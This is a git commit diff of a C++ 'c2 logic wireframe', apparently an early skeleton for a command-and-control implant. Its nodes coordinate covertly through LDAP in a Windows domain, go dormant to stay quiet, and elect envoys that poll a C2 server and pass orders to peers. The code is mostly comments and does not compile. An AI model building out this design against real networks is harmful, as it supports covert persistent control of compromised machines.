be1bce8ec223b70765b15e4a399fbd53cf522013
hornt <horntx3@gmail.com>
2024-11-19 10:10:08 -0500

    c2 logic wireframe

--- main.cpp
+++ main.cpp
@@ -4,100 +4,122 @@
 #include <json/json.h>
 
 enum State { //The current state of the agent
-    INIT,
-    WAIT_FOR_PEERS,
-    SLEEP,
-    DORMANT,
-    ACTIVE,
-    INTENSIVE,
-    PANIC
+    INIT,                           //starting state, attempt to contact network
+    WAIT_FOR_PEERS,                 //wait for configuration information
+    SLEEP,                          //communication is not possible, likely box issue. Lie low until connection re-established
+    DORMANT,                        //this network is not needed at the moment. Lie low until activated.
+    ACTIVE,                         //normal working state
+    INTENSIVE,                      //louder or more expensive tasks that can be run less frequently
+    PANIC                           //network connection lost, try everything possible to re-establish communication
 };
 
 //abstract class representing a network
 class networkObject {
-    protected:
-    State state;
+protected:
+    State state;                    //which state of the state machine is the network in
+    virtual void doStep();          //do the actual work for each state.
+    static list peers;              //list of active peer nodes (shared between networks)
 
-    public:
-    bool stateChanged;
+public:
+    int stateCounter;               //how many steps we have been in the current state
+    int stepTime;                   //time between network transactions.
 
-    //function which handles a state change
-    virtual void changeState() {}
-    virtual State getState() { return state; }
+    virutal void changeState() {    //update universal variables on state change
+        stateCounter = 0;
+        state = newState;
+    }
+    virtual State getState()        //
+    { return state; }
 
-    //main statemachine function
-    virtual void doStep() {}
+
+    virtual void step(){            //update all the universal variables, then call network specific implementation
+        stateCounter++;
+        doStep();
+    }
 };
 
 class MeshNet : networkObject{
-public:
-    int networkStep;       // Stores the time between network transactions.
-    int heavyCounter;      // Keeps track of how many light steps have occured. Light steps skip most of the intensive LDAP queries.
-    std::string me;        // Stores the name of the current machine
-    std::string domain;    // Stores the Domain name
-    std::string network;   // Stores the LDAP address of the meshnet settings in LDAP
-
-    State state;
-
-    void changeState(State newState) {
-        state = newState;
-        stateChanged = true;
+protected:
+    string doLDAPQuery(string query){
+        //error handling
+        //error: can't connect to DC -> move to sleep
+        //error: attribute not found -> init
     }
 
     void doStep() {
-        stateChanged = false;
-
         switch (state) {
             case INIT:
-                //attempt to set the LDAP joined flag
-                    // if successful move to WAIT_FOR_PEERS
-                        // Otherwise attempt to configure the LDAP schema
-                            // if unable, move to dormaint
-                                state = WAIT_FOR_PEERS;
+                // set own LDAP active flag
+                // query LDAP for other active users
+                // if other users found, send envoy:join
+                // if successful move to WAIT_FOR_PEERS
+                // if no other users, attempt to configure the LDAP schema then move to WAIT_FOR_PEERS
+                // if unable due to permissions, move to dormant
+                // if unable due to network, move to sleep
             case WAIT_FOR_PEERS:
-                //read the settings object
-                    // if recived move to ACTIVE
-                        // else continue waiting
-                            // if waiting for more than 3 loops then force promote to envoy
-                                state = ACTIVE;
+                // check command list for an envoy:settings command
+                // if received set settings and set peers from envoy:devices (if available) and go to active
+                // else continue waiting
+                // if waiting for more than 4 loops then move to INIT
+                state = ACTIVE;
             case ACTIVE:
-                //query for new commands,
-                    //return the value
-                        //after x steps move to intensive
-                            //if no commands for x steps move to panic
-                                heavyCounter++;
-            if (heavyCounter >= 5) {
-                heavyCounter = 0;
-                state = INTENSIVE;
-            }
+                //check for new commands
+                //return the value
+
+                //Every x steps in active run the heavy-duty stuff
+                if (stateCounter % intensiveCount == 0) {
+                    changeState(INTENSIVE);
+                    doStep() //run the intensive items immediately
+                }
             case INTENSIVE:
-                //query for new peers
-                    //Send network config to new peer
-                        //check envoyStatus
-                            // if additional envoys needed attempt to move to envoy
-                                state = ACTIVE;
+                //check up on other members. If they have more than 2 steps of commands in their queue mark them as dead.
+                //remove them from peers, remove LDAP active flag and send an envoy:unjoin to all peers on their behalf
+                changeState(ACTIVE); // go back to normal load
+            case DORMANT:
+                // check if LDAP is configured. If it is move to INIT
+            case SLEEP:
+                // check if DC is pingable. If it is move to INIT
+                // every 10 checks go to INIT anyways
         }
     }
+
+public:
+    string me;                      // Stores the name of the current machine
+    string domain;                  // Stores the Domain name
+    int intensiveCount;             // How obtain should intensive steps be run
 };
 
 class Envoy : networkObject{
-    public:
-    State state;
-    std::string c2Address;
+protected:
     //linked list storing connection methods
-};
 
-class Peer {
-    public:
-    int id;
-    std::string LDAPName;
-    std::string hostname;
-    std::string ip;
-};
+    void doStep() {
+        switch (state) {
+            case INIT:
+                //attempt all preferred methods
+                //on success write envoy:settings to self
+                //if unavailable due to network, then sleep.
+            case ACTIVE:
+                //check peers for envoy status, demote to dormant if too many
+                //Poll c2 for orders
+                //distribute commands
+                //update envoy heartbeat
+            case PANIC:
+                //run a ping with every connection method in envoy, in order of preference
+                //if one is successful then move to active with that method
+            case DORMANT:
+                //check envoy status, if more envoys needed then promote
+            case SLEEP:
+                //check for network connectivitiy (ping www.msftconnecttest.com)
+                //if avalaible move to dormant
+                // every 10 checks go to INIT anyways
+        }
+    }
+public:
+    State state;
+    string c2Address;
+    int targetEnvoyNumber;          //how many envoys to keep promoted at any given time
 
-class ipv4 {
-    public:
-    int[4] octects;
 };
 
 int main() {
@@ -110,28 +132,9 @@ int main() {
         int startTime = time(NULL);
         //debug: print state information
 
-        //Main state machine
-
-
-        do while (envoy.stateChanged){}
-        switch(envoy.state) {
-            case SLEEP:
-                //check for network connectivitiy (ping www.msftconnecttest.com)
-                //if avalaible move to init
-            case INIT:
-                //attempt to poll mesh for envoy status using all prefered methods registered with envoy
-                //if unavailable due to network, then sleep.
-                //if Envoys are needed, then register, then promote
-            case ACTIVE:
-                //check meshnet envoy status, demote to dormant if too many
-                //Poll c2 for orders
-                //distribute commands
-                //update envoy heartbeat
-            case PANIC:
-                //attempt every conneciton method in envoy
-            case DORMANT:
-                //check envoy status, if more envoys needed then promote
-        }
+        //Main state machines
+        mesh.step()
+        envoy.step()
 
         sleep(mesh.networkStep - time() + startTime);
     }
